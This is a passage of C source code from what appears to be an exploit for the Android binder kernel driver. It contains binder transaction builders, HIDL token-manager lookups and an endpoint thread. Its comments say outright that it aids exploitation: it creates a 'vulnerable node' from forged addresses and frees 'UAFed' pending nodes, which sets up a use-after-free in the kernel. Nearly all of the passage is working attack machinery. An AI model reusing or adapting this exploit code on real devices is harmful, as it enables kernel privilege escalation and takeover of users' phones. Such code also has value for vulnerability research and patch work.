	if (obj && bio->offs_avail) {
		bio->offs_avail--;
		*bio->offs++ = ((char*) obj) - ((char*) bio->data0);
	}

	/* Compute the offset index. */
	obj->hdr.type = BINDER_TYPE_PTR;
	obj->flags |= BIO_F_OVERFLOW;
	obj->buffer = NULL;  /* The buffer address will need a fixup, this is dealt with the bio_fixup_ptr. */
	obj->length = size;
	obj->parent = 0;
	obj->parent_offset = 0;

	/* Copy the data to the binder buffer. */
	memcpy((obj + 1), buffer, size);

	if (off)
		*off = ((uint64_t)bio->offs - (uint64_t)bio->offs0) / sizeof(uint64_t) - 1;

	return NULL;
}

/* Fixup a ptr address of a BINDER_TYPE_PTR object given it's offset. */
void bio_fixup_ptr(struct binder_io *bio, void *base, uint32_t ptr_off)
{
	struct binder_buffer_object *obj;

	//TODO: Check the offset.
	
	/* Check it's actually a BINDER_TYPE_PTR */
	obj = (struct binder_buffer_object *)(bio->data0 + bio->offs0[ptr_off]);
	if (obj->hdr.type != BINDER_TYPE_PTR) {
		log_err("bio_fixup_ptr() -> Not a binder buffer object.\n");
		exit(1);
		return;
	}

	uint64_t buffer_off = bio->offs0[ptr_off] + sizeof(*obj);

	obj->buffer = base + buffer_off;
	log_info("obj->buffer: %p\n", obj->buffer);
}

/*
 * Create a BINDER_TYPE_FDA object, and give in parameters the parent offset in
 * the transaction, as well as the number of file descriptors, and the offset within
 * the parent BINDER_TYPE_PTR object.
 */
void bio_put_fd_array(struct binder_io *bio, uint64_t parent, uint64_t parent_offset, int num_fds)
{
	int i;
	struct binder_fd_array_object *fd_obj;

	/* Allocate the object containing the array. */
	fd_obj = bio_alloc(bio, sizeof(*fd_obj));
	if (!fd_obj)
		return;

	if (fd_obj && bio->offs_avail) {
		bio->offs_avail--;
		*bio->offs++ = ((char*) fd_obj) - ((char*) bio->data0);
	}

	fd_obj->hdr.type = BINDER_TYPE_FDA;
	fd_obj->num_fds = num_fds;
	fd_obj->parent = parent;
	fd_obj->parent_offset = parent_offset;
}

void bio_put_fd(struct binder_io *bio, int fd)
{
    struct binder_fd_object *obj;

    obj = bio_alloc_obj(bio);
    if (!obj)
        return;

    obj->hdr.type = BINDER_TYPE_FD;
    obj->fd = fd;
    obj->cookie = 0;
}

void bio_put_ref(struct binder_io *bio, uint32_t handle)
{
    struct flat_binder_object *obj;

    if (handle)
        obj = bio_alloc_obj(bio);
    else
        obj = bio_alloc(bio, sizeof(*obj));

    if (!obj)
        return;

    obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
    obj->hdr.type = BINDER_TYPE_HANDLE;
    obj->handle = handle;
    obj->cookie = 0;
}




void bio_put_string16(struct binder_io *bio, const uint16_t *str)
{
    size_t len;
    uint16_t *ptr;

    if (!str) {
        bio_put_uint32(bio, 0xffffffff);
        return;
    }

    len = 0;
    while (str[len]) len++;

    if (len >= (MAX_BIO_SIZE / sizeof(uint16_t))) {
        bio_put_uint32(bio, 0xffffffff);
        return;
    }

    /* Note: The payload will carry 32bit size instead of size_t */
    bio_put_uint32(bio, (uint32_t) len);
    len = (len + 1) * sizeof(uint16_t);
    ptr = bio_alloc(bio, len);
    if (ptr)
        memcpy(ptr, str, len);
}

void bio_put_string16_x(struct binder_io *bio, const char *_str)
{
    unsigned char *str = (unsigned char*) _str;
    size_t len;
    uint16_t *ptr;

    if (!str) {
        bio_put_uint32(bio, 0xffffffff);
        return;
    }

    len = strlen(_str);

    if (len >= (MAX_BIO_SIZE / sizeof(uint16_t))) {
        bio_put_uint32(bio, 0xffffffff);
        return;
    }

    /* Note: The payload will carry 32bit size instead of size_t */
    bio_put_uint32(bio, len);
    ptr = bio_alloc(bio, (len + 1) * sizeof(uint16_t));
    if (!ptr)
        return;

    while (*str)
        *ptr++ = *str++;
    *ptr++ = 0;
}

static void *bio_get(struct binder_io *bio, size_t size)
{
    size = (size + 3) & (~3);

    if (bio->data_avail < size){
        bio->data_avail = 0;
        bio->flags |= BIO_F_OVERFLOW;
        return NULL;
    }  else {
        void *ptr = bio->data;
        bio->data += size;
        bio->data_avail -= size;
        return ptr;
    }
}

uint32_t bio_get_uint32(struct binder_io *bio)
{
    uint32_t *ptr = bio_get(bio, sizeof(*ptr));
    return ptr ? *ptr : 0;
}

uint16_t *bio_get_string16(struct binder_io *bio, size_t *sz)
{
    size_t len;

    /* Note: The payload will carry 32bit size instead of size_t */
    len = (size_t) bio_get_uint32(bio);
    if (sz)
        *sz = len;
    return bio_get(bio, (len + 1) * sizeof(uint16_t));
}

static struct flat_binder_object *_bio_get_obj(struct binder_io *bio)
{
    size_t n;
    size_t off = bio->data - bio->data0;

    /* TODO: be smarter about this? */
    for (n = 0; n < bio->offs_avail; n++) {
        if (bio->offs[n] == off)
            return bio_get(bio, sizeof(struct flat_binder_object));
    }

    bio->data_avail = 0;
    bio->flags |= BIO_F_OVERFLOW;
    return NULL;
}

uint32_t bio_get_ref(struct binder_io *bio)
{
    struct flat_binder_object *obj;

    obj = _bio_get_obj(bio);
//    log_info("[*] Ref object at %p\n", obj);
    
    if (!obj)
        return 0;

    if (obj->hdr.type == BINDER_TYPE_HANDLE) {
        return obj->handle;
    }

    /* I added that for my tests, but I shouldn't be needed on Android. */
    if (obj->hdr.type == BINDER_TYPE_BINDER) {
	    return obj->handle;
    }

    return 0;
}

/* This is custom code added to the binder API, to aid in exploitation. */
int binder_read(int fd, void *buffer, size_t size)
{
	int res;
	struct binder_write_read bwr;

	bzero(&bwr, sizeof(bwr));

	bwr.read_buffer = buffer;
	bwr.read_size = size;

	res = ioctl(fd, BINDER_WRITE_READ, &bwr);

	if (res < 0) {
		log_err("binder_read() -> %s\n", strerror(errno));
		return res;
	}


	return bwr.read_consumed;
}

void *make_transaction(void *buffer, bool one_way, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size)
{
	struct binder_transaction_data *tr;
	*(uint32_t *)buffer = BC_TRANSACTION;
	tr = (struct binder_transaction_data *)(buffer + sizeof(uint32_t));

	tr->target.handle = handle;
	//tr->flags = TF_ONE_WAY;
	tr->flags = one_way ? TF_ONE_WAY : 0;
	/* We do accept FDS. */
	tr->flags |= TF_ACCEPT_FDS;
	tr->data.ptr.buffer = opaque;
	tr->data_size = opaque_size;
	tr->data.ptr.offsets = offsets;
	tr->offsets_size = offsets_size;


	/* Return a pointer to the location for the next command. */
	return (void *)(tr + 1);
}

void *make_reply(void *buffer, bool one_way, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size)
{
	struct binder_transaction_data *tr;
	*(uint32_t *)buffer = BC_REPLY;
	tr = (struct binder_transaction_data *)(buffer + sizeof(uint32_t));

	tr->target.handle = handle;
	//tr->flags = TF_ONE_WAY;
	tr->flags = one_way ? TF_ONE_WAY : 0;
	tr->data.ptr.buffer = opaque;
	tr->data_size = opaque_size;
	tr->data.ptr.offsets = offsets;
	tr->offsets_size = offsets_size;


	/* Return a pointer to the location for the next command. */
	return (void *)(tr + 1);
}


int binder_transaction(struct binder_state *bs, bool one_way, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size)
{
	struct binder_transaction_data *tr;
	uint8_t buffer[sizeof(uint32_t) + sizeof(*tr)];
	uint32_t remaining = 0;
	uint32_t consumed = 0;

	make_transaction(buffer, one_way, handle, opaque, opaque_size, offsets, offsets_size);

	/* Sending the transaction. */
	int res = binder_write(bs, buffer, sizeof(buffer));
	if (res < 0)
		return res;
#if 0
	uint32_t r[32];
	int r2;
	r2 = binder_read(bs->fd, r, 32 * sizeof(uint32_t));
	/* TODO: Check results. */
	int i;
#endif


	return res;
}

int binder_reply(struct binder_state *bs, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size)
{
	void *buffer;
	struct binder_transaction_data *tr;
	size_t size = sizeof(uint32_t) + sizeof(*tr);


	buffer = malloc(size);
	if (buffer == NULL) {
		log_err("[-] binder_transaction. Failed to allocate memory.\n");
		return -1;
	}

	bzero(buffer, size);


	make_transaction(buffer, false, handle, opaque, opaque_size, offsets, offsets_size);

	*(uint32_t *)(buffer) = BC_REPLY;

	/* Sending the transaction. */
	int res = binder_write(bs, buffer, size);
	/* TODO: Check result. */

	uint32_t r[32];
	int r2;
	r2 = binder_read(bs->fd, r, 32 * sizeof(uint32_t));
	/* TODO: Check results. */
	int i;

	free(buffer);

	return res;
}

uint32_t binder_read_next(struct binder_state *bs, void *data, uint32_t *remaining, uint32_t *consumed)
{
	int res;
	uint32_t cmd;
	void *ptr, *end;

//	log_info("remaining: %x\nconsumed: %x\n", *remaining, *consumed);

	if (!*remaining) {
		/* Read the first 8 bytes. */
//		log_info("before read\n");
		res = binder_read(bs->fd, data, 32 * sizeof(uint32_t));
//		log_info("after read: %x\n", res);
		if (res < 0) {
			log_err("binder_read_next: %s\n", strerror(errno));
			return (uint32_t)-1;
		}

		*remaining = res;
		*consumed = 0;
	}


	ptr = data;
	ptr += *consumed;
	end = ptr + *remaining;

	cmd = *(uint32_t *)ptr;

	*consumed += sizeof(uint32_t);
	*remaining -= sizeof(uint32_t);
	ptr += sizeof(uint32_t);

	//log_info("cmd: %s\n", cmd_name(cmd));
	switch (cmd) {
		case BR_NOOP:
			res = 0;
			break;

		case BR_RELEASE:
		case BR_DECREFS:
		case BR_ACQUIRE:
		case BR_INCREFS:
			res =2 * sizeof(uint64_t);
			*consumed += res;
			*remaining -= res;
			break;
		case BR_REPLY:
		case BR_TRANSACTION:
			res = sizeof(struct binder_transaction_data);
			*consumed += res;
			*remaining -= res;
			break;
		case BR_FAILED_REPLY:
		case BR_TRANSACTION_COMPLETE:
			res = 0;
			break;
		default:
			log_err("Unhandle command %s\n", cmd_name(cmd));
			exit(1);
			return (uint32_t)-1;

	}

	/* Update ptr and size */
	return cmd;
}

uint32_t binder_read_next_dbg(struct binder_state *bs, void *data, uint32_t *remaining, uint32_t *consumed)
{
	int res;
	uint32_t cmd;
	void *ptr, *end;

	log_info("remaining: %x\nconsumed: %x\n", *remaining, *consumed);

	if (!*remaining) {
		/* Read the first 8 bytes. */
//		log_info("before read\n");
		res = binder_read(bs->fd, data, 32 * sizeof(uint32_t));
//		log_info("after read: %x\n", res);
		if (res < 0) {
			log_err("binder_read_next: %s\n", strerror(errno));
			return (uint32_t)-1;
		}

		*remaining = res;
		*consumed = 0;
	}


	ptr = data;
	ptr += *consumed;
	end = ptr + *remaining;

	cmd = *(uint32_t *)ptr;

	*consumed += sizeof(uint32_t);
	*remaining -= sizeof(uint32_t);
	ptr += sizeof(uint32_t);

	log_info("cmd: %s\n", cmd_name(cmd));
	switch (cmd) {
		case BR_NOOP:
			res = 0;
			break;

		case BR_RELEASE:
		case BR_DECREFS:
		case BR_ACQUIRE:
		case BR_INCREFS:
			log_info("ptr: 0x%llx\n", *(uint64_t *)(ptr));
			log_info("cookie: 0x%llx\n", *(uint64_t *)(ptr + 0x8));
			res =2 * sizeof(uint64_t);
			*consumed += res;
			*remaining -= res;
			break;
		case BR_REPLY:
		case BR_TRANSACTION:
			res = sizeof(struct binder_transaction_data);
			*consumed += res;
			*remaining -= res;
			break;
		case BR_FAILED_REPLY:
		case BR_TRANSACTION_COMPLETE:
			res = 0;
			break;
		default:
			log_err("Unhandle command %s\n", cmd_name(cmd));
			exit(1);
			return (uint32_t)-1;

	}

	/* Update ptr and size */
	return cmd;
}


```

`src/binder_lookup.c`:

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <android/log.h>

#include "binder.h"
#include "binder_lookup.h"
#include "log.h"

#define HWSERVICE_MANAGER "android.hidl.manager@1.0::IServiceManager"
#define TOKEN_MANAGER   "android.hidl.token@1.0::ITokenManager"


typedef void * hidl_pointer;

struct hidl_handle {
   hidl_pointer phandle;
   bool owns_handle;
};

typedef struct hidl_string {
   hidl_pointer buffer;
   uint32_t size;
   bool owns_buffer;
} hidl_string;

typedef struct hidl_vec {
   hidl_pointer buffer;
   uint32_t size;
   bool owns_buffer;
} hidl_vec;

typedef struct service_list {
   struct service_list *next;
   const char *service_name;
   hidl_vec *token;
} service_list_t;

static service_list_t *services = NULL;


bool add_service_token(const char *service, hidl_vec *token)
{
   service_list_t *entry, *tmp;

   entry = calloc(1, sizeof(*entry));
   if (!entry)
      return false;

   /* Insert. */
   tmp = services;

   entry->service_name = strdup(service);
   entry->token = token;
   entry->next = tmp;

   if (!tmp) {
      services = entry;
   } else {
      entry->next = services;
      services = entry;
   }

   return true;
}

hidl_vec *get_service_token(const char *service)
{
   service_list_t *entry = services;

   while (entry) {
      if (!strcmp(entry->service_name, service))
         return entry->token;

      entry = entry->next;
   }

   return NULL;
}

/* Create wrapper for hidl_strings. */
hidl_string *hidl_string_new(const char *str)
{
   size_t len;
   hidl_string *hstr = calloc(1, sizeof(*hstr));
   if (!hstr)
      return NULL;

   len = strlen(str);

   hstr->buffer = (hidl_pointer)malloc(len + 1);
   if (!hstr->buffer) {
      free(hstr);
      return NULL;
   }

   strcpy(hstr->buffer, str);
   hstr->size = len;

   return hstr;
}

uint64_t find_hwservice(struct binder_state *bs, const char *service)
{
   uint8_t txn_data[0x1000];
   uint8_t reply_data[0x1000];
   uint8_t *ptr = txn_data;
   uint64_t offsets[0x10];
   uint64_t *offs = offsets;
   struct binder_write_read bwr;
   uint32_t buffers_size = 0;

   struct hidl_string *name;
   struct hidl_string *instance;
   uint64_t name_parent_off = 0;
   uint64_t instance_parent_off = 0;

   struct binder_buffer_object *bbo = NULL;

   struct {
      uint32_t cmd;
      struct binder_transaction_data txn;
      binder_size_t buffers_size;
   } __attribute__((packed)) writebuf;


   memset(txn_data, 0, 0x1000);
   bzero(&bwr, sizeof(bwr));


   name = hidl_string_new(service);
   instance = hidl_string_new("default");

   ptr = txn_data;

   /* Write the interface token first, as a classic C string, while taking
    * care of padding to 32bits.
    */
   memcpy(ptr, HWSERVICE_MANAGER, sizeof(HWSERVICE_MANAGER) + 1);
   ptr += sizeof(HWSERVICE_MANAGER) + 1;

   /* Align on 32bits. */
   while (((uint64_t)ptr) % sizeof(uint32_t))
      ptr++;

   /* write the hidl_string. */
   bbo = (struct binder_buffer_object *)ptr;
   bbo[0].hdr.type = BINDER_TYPE_PTR;
   bbo[0].buffer = name;
   bbo[0].length  = sizeof(struct hidl_string);
   bbo[0].flags = 0;
   bbo[0].parent = 0;
   bbo[0].parent_offset = 0;
   name_parent_off = (uint64_t)((uint8_t*)bbo - txn_data);
   buffers_size += bbo[0].length;
   *(offs++) = name_parent_off;

   ptr = &bbo[1];

   /* Embed the pointer. */
   bbo[1].hdr.type = BINDER_TYPE_PTR;
   bbo[1].buffer = name->buffer;
   bbo[1].length  = name->size + 1;
   bbo[1].flags = 1; //HAS_PARENT;
   //bbo[1].parent = name_parent_off;
   bbo[1].parent = 0;
   bbo[1].parent_offset = 0;
   buffers_size += bbo[1].length;
   *(offs++) = (uint64_t)((uint8_t*)&bbo[1] - txn_data);

   ptr = &bbo[2];

   bbo[2].hdr.type = BINDER_TYPE_PTR;
   bbo[2].buffer = instance;
   bbo[2].length = sizeof(struct hidl_string);
   bbo[2].flags = 0;
   instance_parent_off = (uint64_t)((uint8_t *)&bbo[2] - txn_data);
   *(offs++) = (uint64_t)((uint8_t*)&bbo[2] - txn_data);
   buffers_size += bbo[2].length;

   /* Embed the pointer. */
   bbo[3].hdr.type = BINDER_TYPE_PTR;
   bbo[3].buffer = instance->buffer;
   bbo[3].length  = instance->size + 1;
   bbo[3].flags = 1; //HAS_PARENT;
   //bbo[3].parent = instance_parent_off;
   bbo[3].parent = 2;
   bbo[3].parent_offset = 0;
   *(offs++) = (uint64_t)((uint8_t*)&bbo[3] - txn_data);
   buffers_size += bbo[3].length;

   ptr = &bbo[4];

   /* Send the BINDER_TRANSACTION_SG. */
   writebuf.cmd = BC_TRANSACTION_SG;
   writebuf.txn.target.handle = 0;
   writebuf.txn.code = 1;
   writebuf.txn.flags = 0;
   writebuf.txn.data_size = (uint64_t)ptr - (uint64_t)txn_data;
   writebuf.txn.offsets_size = (uint64_t)offs - (uint64_t)offsets;
   writebuf.txn.data.ptr.buffer = txn_data;
   writebuf.txn.data.ptr.offsets = offsets;

   /* Align buffers size. */
   while (buffers_size % 8)
      buffers_size++;
   writebuf.buffers_size = buffers_size;

   bwr.write_size = sizeof(writebuf);
   bwr.write_consumed = 0;
   bwr.write_buffer = &writebuf;
   bwr.read_size = 0;
   bwr.read_consumed = 0;
   bwr.read_buffer = 0;

   /* Send query. */
   ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
   uint32_t remaining, consumed;
   uint32_t rdata[32];
   remaining = 0, consumed = 0;

   while (binder_read_next(bs, rdata, &remaining, &consumed) != BR_REPLY);

   struct binder_transaction_data *tr = (struct binder_transaction *)((uint8_t*)rdata + consumed - sizeof(*tr));

   struct flat_binder_object *fbo = (struct flat_binder_object *)(tr->data.ptr.buffer + 4);

   /* Acquire the ref. */
   binder_acquire(bs, fbo->handle);

   /* Free the transaction. */
   binder_free_buffer(bs, tr->data.ptr.buffer);

   return fbo->handle;
}

hidl_vec * create_token(struct binder_state *bs, uint64_t tm_handle, uint64_t my_handle)
{
   uint8_t txn_data[0x1000];
   uint8_t reply_data[0x1000];
   uint8_t *ptr = txn_data;
   uint64_t offsets[0x10];
   uint64_t *offs = offsets;
   struct binder_write_read bwr;
   uint32_t buffers_size = 0;

   struct hidl_string *name;
   struct hidl_string *instance;
   uint64_t name_parent_off = 0;
   uint64_t instance_parent_off = 0;

   struct binder_buffer_object *bbo = NULL;

   struct {
      uint32_t cmd;
      struct binder_transaction_data txn;
      binder_size_t buffers_size;
   } __attribute__((packed)) writebuf;


   memset(txn_data, 0, 0x1000);
   bzero(&bwr, sizeof(bwr));


   ptr = txn_data;

   /* Write the interface token first, as a classic C string, while taking
    * care of padding to 32bits.
    */
   memcpy(ptr, TOKEN_MANAGER, sizeof(TOKEN_MANAGER) + 1);
   ptr += sizeof(TOKEN_MANAGER) + 1;

   /* Align on 32bits. */
   while (((uint64_t)ptr) % sizeof(uint32_t))
      ptr++;

   /* Add our strong binder. */
   struct flat_binder_object *fbo = (struct flat_binder_object *)ptr;
   fbo->hdr.type = BINDER_TYPE_BINDER;
   fbo->binder = my_handle;
   fbo->cookie = 0;
   *(offs++) = (uint64_t)fbo - (uint64_t)txn_data;
   
   ptr = &fbo[1];

   /* Send the BINDER_TRANSACTION_SG. */
   writebuf.cmd = BC_TRANSACTION_SG;
   writebuf.txn.target.handle = tm_handle;
   writebuf.txn.code = 1; //create_token
   writebuf.txn.flags = 0;
   writebuf.txn.data_size = (uint64_t)ptr - (uint64_t)txn_data;
   writebuf.txn.offsets_size = (uint64_t)offs - (uint64_t)offsets;
   writebuf.txn.data.ptr.buffer = txn_data;
   writebuf.txn.data.ptr.offsets = offsets;

   /* Align buffers size. */
   while (buffers_size % 8)
      buffers_size++;
   writebuf.buffers_size = buffers_size;

   bwr.write_size = sizeof(writebuf);
   bwr.write_consumed = 0;
   bwr.write_buffer = &writebuf;
   bwr.read_size = 0;
   bwr.read_consumed = 0;
   bwr.read_buffer = 0;

   /* Send query. */
   ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
   uint32_t remaining, consumed;
   uint32_t rdata[32];
   remaining = 0, consumed = 0;

   while (binder_read_next(bs, rdata, &remaining, &consumed) != BR_REPLY);

   struct binder_transaction_data *tr = (struct binder_transaction *)((uint8_t*)rdata + consumed - sizeof(*tr));

   /* Okay, build the HIDL vec. */
   bbo = (struct binder_buffer_object *)(tr->data.ptr.buffer + 4);
   hidl_vec *vec = calloc(1, sizeof(*vec));

   //Should check for BINDER_TYPE_PTR

   memcpy(vec, bbo->buffer, sizeof(*vec));

   /* Allocate the vec data. */
   void *data = malloc(vec->size);
   memcpy(data, vec->buffer, vec->size);

   /* replace the pointers. */
   vec->buffer = data;


   binder_free_buffer(bs, tr->data.ptr.buffer);

   /* return the token. */
   return vec;
}

uint32_t get_by_token(struct binder_state *bs, uint64_t tm, hidl_vec *token)
{
   uint8_t txn_data[0x1000];
   uint8_t reply_data[0x1000];
   uint8_t *ptr = txn_data;
   uint64_t offsets[0x10];
   uint64_t *offs = offsets;
   struct binder_write_read bwr;
   uint32_t buffers_size = 0;

   struct hidl_string *name;
   struct hidl_string *instance;
   uint64_t name_parent_off = 0;
   uint64_t instance_parent_off = 0;

   struct binder_buffer_object *bbo = NULL;

   struct {
      uint32_t cmd;
      struct binder_transaction_data txn;
      binder_size_t buffers_size;
   } __attribute__((packed)) writebuf;


   memset(txn_data, 0, 0x1000);
   bzero(&bwr, sizeof(bwr));


   ptr = txn_data;

   /* Write the interface token first, as a classic C string, while taking
    * care of padding to 32bits.
    */
   memcpy(ptr, TOKEN_MANAGER, sizeof(TOKEN_MANAGER) + 1);
   ptr += sizeof(TOKEN_MANAGER) + 1;

   /* Align on 32bits. */
   while (((uint64_t)ptr) % sizeof(uint32_t))
      ptr++;

   
   /* write the hidl_vec. */
   bbo = (struct binder_buffer_object *)ptr;
   bbo[0].hdr.type = BINDER_TYPE_PTR;
   bbo[0].buffer = token;
   bbo[0].length  = sizeof(*token);
   bbo[0].flags = 0;
   bbo[0].parent = 0;
   bbo[0].parent_offset = 0;
   name_parent_off = (uint64_t)((uint8_t*)bbo - txn_data);
   buffers_size += bbo[0].length;
   *(offs++) = name_parent_off;

   ptr = &bbo[1];

   /* Embed the pointer. */
   bbo[1].hdr.type = BINDER_TYPE_PTR;
   bbo[1].buffer = token->buffer;
   bbo[1].length  = token->size;
   bbo[1].flags = 1; //HAS_PARENT;
   //bbo[1].parent = name_parent_off;
   bbo[1].parent = 0;
   bbo[1].parent_offset = 0;
   buffers_size += bbo[1].length;
   *(offs++) = (uint64_t)((uint8_t*)&bbo[1] - txn_data);

   ptr = &bbo[2];


   /* Send the BINDER_TRANSACTION_SG. */
   writebuf.cmd = BC_TRANSACTION_SG;
   writebuf.txn.target.handle = tm;
   writebuf.txn.code = 3; //get_by_token
   writebuf.txn.flags = 0;
   writebuf.txn.data_size = (uint64_t)ptr - (uint64_t)txn_data;
   writebuf.txn.offsets_size = (uint64_t)offs - (uint64_t)offsets;
   writebuf.txn.data.ptr.buffer = txn_data;
   writebuf.txn.data.ptr.offsets = offsets;

   /* Align buffers size. */
   while (buffers_size % 8)
      buffers_size++;
   writebuf.buffers_size = buffers_size;

   bwr.write_size = sizeof(writebuf);
   bwr.write_consumed = 0;
   bwr.write_buffer = &writebuf;
   bwr.read_size = 0;
   bwr.read_consumed = 0;
   bwr.read_buffer = 0;

   /* Send query. */
   ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
   uint32_t remaining, consumed;
   uint32_t rdata[32];
   remaining = 0, consumed = 0;

   while (binder_read_next(bs, rdata, &remaining, &consumed) != BR_REPLY);

   struct binder_transaction_data *tr = (struct binder_transaction *)((uint8_t*)rdata + consumed - sizeof(*tr));

   struct flat_binder_object *fbo = (struct flat_binder_object *)(tr->data.ptr.buffer + 4);

   binder_acquire(bs, fbo->handle);

   return fbo->handle;
}

uint32_t grab_handle(struct binder_state *bs, char *name)
{

   uint64_t tm = find_hwservice(bs, TOKEN_MANAGER);

   hidl_vec *token = get_service_token(name);
   if (!token)
      return 0;

   uint32_t handle = get_by_token(bs, tm, token);

   binder_release(bs, tm);
   return handle;
}

int publish_handle(struct binder_state *bs, uint64_t handle, char *name)
{
   uint64_t tm = find_hwservice(bs, TOKEN_MANAGER);

   hidl_vec *vec = create_token(bs, tm, handle);
   if (!vec)
      return 0;

   /* Make the association. */
   add_service_token(name, vec);


   /* release the reference. */
   binder_release(bs, tm);

   return 1;
}


```

`src/endpoint.c`:

```c
#include <sched.h>
#include <stdio.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <poll.h>
#include <sys/epoll.h>
#include <errno.h>
#include <setjmp.h>

#include "binder.h"
#include "handle.h"
#include "log.h"
#include "endpoint.h"
#include "pending_node.h"


static struct endpoint_handle *endpoints = NULL;

static int endpoint_transaction_handler(struct endpoint_handle *handle, struct binder_transaction_data *tr, struct binder_io *msg, struct binder_io *reply)
{

	int res = 1;
	struct binder_state *bs = handle->bs;
	pthread_t th;

	switch (tr->code) {
		case GET_VMA_START:
			/* Do it in 2 times. */
			bio_put_uint32(reply, (uint32_t)bs->mapped);
			bio_put_uint32(reply, (uint32_t)(((uint64_t)(bs->mapped)>>32)));
			res = 0;
			break;
		case EXCHANGE_HANDLES:
			handle->client_handle = bio_get_ref(msg);
			/* Acquire the handle. */
			binder_acquire(bs, handle->client_handle);

			/* Create the vulnerable node in the process. */
			bio_put_obj(reply, bs->mapped + 0xe8);
			uint64_t node2 = bs->mapped + 0xe8;
			node2 = node2 & 0xFFFFFFFF;
			node2 = node2 << 32;
			node2 += 0x42;

			bio_put_obj(reply, node2);
			res = 0;
			break;
		case ADD_PENDING_NODE:
			add_pending_node(bs, handle->client_handle);
			//uaf_node_th = add_pending_node(bs, client_handle);
			//log_info("uaf_node_th: %p\n", uaf_node_th);
			res = 0;
			break;
		case TERMINATE_PENDING_NODE:
			th = bio_get_uint32(msg) + (((uint64_t)bio_get_uint32(msg)) << 32);
			terminate_pending_node(th);
			res = 0;
			break;
		case RESERVE_BUFFER:
			if (handle->reserved_buffer) {
				log_err("A buffer is already reserved. Free it if you want to reserve another one.\n");
				res = -1;
				break;
			}
			else {
				handle->reserved_buffer = tr->data.ptr.buffer;
				res = 42; /* Instruct the calling function to skip freeing the buffer. */
			}
			break;
		case FREE_RESERVED_BUFFER:
			if (handle->reserved_buffer) {
				binder_free_buffer(bs, handle->reserved_buffer);
				handle->reserved_buffer = 0;
			}
			res = 0;
			break;
		case TRIGGER_DECREF:
			res = 0;
			break;
		default:
			log_err("[-] Unknown transaction code.\n");
			break;
	}


	return res;

}

static struct endpoint_handle *_lookup_by_name(const char *name)
{
	struct endpoint_handle *handle = endpoints;

	while (handle) {
		if (!strcmp(name, handle->name))
				return handle;
		handle = handle->next;
	}

	return NULL;
}

static struct endpoint_handle *_lookup_by_pid(pid_t pid)
{
	struct endpoint_handle *handle = endpoints;

	while (handle) {
		if (handle->pid == pid)
			return handle;
		handle = handle->next;
	}

	return NULL;
}


void plop(void)
{
	struct endpoint_handle *handle = NULL;

	/* Setup jmpbufs. */
	handle = _lookup_by_pid(syscall(__NR_gettid));

	/* Close binder to release the UAFed pending node.
	 * This is the only way to actually free them without entered
	 * the binder_transaction_buffer_release() function.
	 */
	binder_close(handle->bs);
	handle->status = 0;

	/* longjmp. */
	longjmp(handle->env, 0);

}


/*
 * The binder endpoint thread. 
 */
static void *endpoint_thread(void *args)
{
	uint8_t data[128];
	uint32_t remaining = 0;
	uint32_t consumed = 0;
	struct endpoint_handle *handle = (struct endpoint_handle *)args;


	setjmp(handle->env);

	signal(SIGTERM, plop);

	handle->bs = binder_open(BINDER_DEVICE, 128 * 1024);
	if (!handle->bs) {
		log_err("[-] Failed to open binder device.\n");
		goto error;
	}

	/* Publish our endpoint name using the fake system server of our APK. */
	if (!publish_handle(handle->bs, 0x42, handle->name)) {
		log_err("[-] Failed to publish handle\n");
		goto error;
	}

	/* Enter looper. */
	uint32_t looper = BC_ENTER_LOOPER;
	binder_write(handle->bs, &looper, sizeof(looper));

	/* Everything's fine. */
	handle->status = 1;
	pthread_barrier_wait(&handle->barrier);

	/* We do this "manually" and don't rely to much on the binder api because
	 * we do some weird things.
	 */
	uint32_t cmd;
	struct binder_transaction_data *tr;


	while ((cmd = binder_read_next(handle->bs, data, &remaining, &consumed))) {
		switch (cmd) {
			case BR_DECREFS:
				break;
			case BR_TRANSACTION: {
				uint8_t rdata[256];
				struct binder_io msg;
				struct binder_io reply;
				int res;

				tr = (struct binder_transaction_data *)(data + consumed - sizeof(*tr));
				bio_init(&reply, rdata, sizeof(rdata), 4);
				bio_init_from_txn(&msg, tr);
				res = endpoint_transaction_handler(handle, tr, &msg, &reply);
				if (tr->flags & TF_ONE_WAY) {
					if (res == 42)
						continue;
					binder_free_buffer(handle->bs, tr->data.ptr.buffer);
				} else {
					if (res == 42)
						/* we reply, but skip freing the buffer. */
						binder_send_reply(handle->bs, &reply, NULL, 0);
					else
						binder_send_reply(handle->bs, &reply, tr->data.ptr.buffer, 0);
				}	
				break;
		        }
			default:
				break;
		}
	}


	exit(0);
error:
	handle->status = -1;
	pthread_barrier_wait(&handle->barrier);
	exit(0);
}



void endpoint_reset(const char *endpoint_name)
{
	struct endpoint_handle *handle = NULL;

	/* Double check that the name doesn't already exists. */
	if ((handle = _lookup_by_name(endpoint_name)) == NULL) {
		log_err("[-] An endpoint already exists with that name\n");
		return;
	}

   /* Reset the endpoint. */
	kill(handle->pid, SIGTERM);

	/* Wait on barrier. */
	pthread_barrier_wait(&handle->barrier);
}

static void endpoint_handle_free(struct endpoint_handle *handle)
{
	struct endpoint_handle *tmp = endpoints;


	/* Start by removing from linked list. */
	if (handle == endpoints) {
		endpoints = handle->next;
	} else {
		while (tmp->next != handle)
			tmp = tmp->next;
		/* Remove */
		tmp->next = handle->next;
	}

	free(handle->name);
	free(handle->stack);
	binder_close(handle->bs);
	free(handle);
}

/*
 * Bootstrap the binder endpoint.
 */
bool bootstrap_endpoint(const char *endpoint_name)
{
	struct endpoint_handle *handle = NULL;


	/* Double check that the name doesn't already exists. */
	if (_lookup_by_name(endpoint_name) != NULL) {
		log_err("[-] An endpoint already exists with that name\n");
		return false;
	}

	/* Allocate handle. */
	handle = malloc(sizeof(*handle));
	if (handle == -1) {
		log_err("[-] Unable to allocate endpoint handle. Reason: '%s'\n", strerror(errno));
		return false;
	}

	memset(handle, 0, sizeof(*handle));

	if (pthread_barrier_init(&handle->barrier, NULL, 2)) {
